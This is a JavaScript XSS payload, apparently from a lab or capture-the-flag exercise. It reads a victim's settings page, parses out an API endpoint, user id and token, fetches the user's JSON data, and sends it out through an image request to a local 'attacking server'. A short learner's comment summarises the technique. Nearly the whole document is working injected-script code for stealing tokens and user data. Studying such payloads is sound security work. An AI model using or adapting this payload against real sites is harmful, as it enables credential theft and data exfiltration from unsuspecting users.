<script>
	var xhttp = new XMLHttpRequest();
	var val = '';
	var url1 = document.getElementById('settings').href;
	var url2 = '';
	var uid = '';
	var token = '';
	xhttp.open('GET',url1,true);
	xhttp.responseType = 'document';
	xhttp.onreadystatechange = function() {
		if(this.readyState == 4 && this.status == 200){
			myXML(this);
			var req = new XMLHttpRequest();
			req.open('GET',url2+'?uid='+uid+'&token='+token,true);
			req.send();
			req.onreadystatechange = function() {
				if(this.readyState == 4 && this.status == 200){
					myJSON(this);
					new Image().src = 'http://127.0.0.1/?test='+ document.getElementById('result').innerHTML;
				};
			};
		};
	};
	xhttp.send();
function myXML(xml) {
	var xmlDoc;
	xmlDoc = xml.responseXML;
	console.log(xmlDoc);
	url2 = xmlDoc.getElementsByTagName("endpoint")[0].childNodes[0].nodeValue;
	uid = xmlDoc.getElementsByTagName("uid-param-value")[0].childNodes[0].nodeValue;
	token = xmlDoc.getElementsByTagName("token-param-value")[0].childNodes[0].nodeValue;
};
function myJSON(json) {
	var obj = JSON.parse(json.responseText);
	for (x in obj) {
		var temp = x + ":" + obj[x];
		document.getElementById('result').innerHTML += temp + "<br>";
	};
};
</script>

/* things learned,
 * we can iterate through the xml node to get value and use json parseing to get values and add it back to the DOM and the send it back to out attacking server
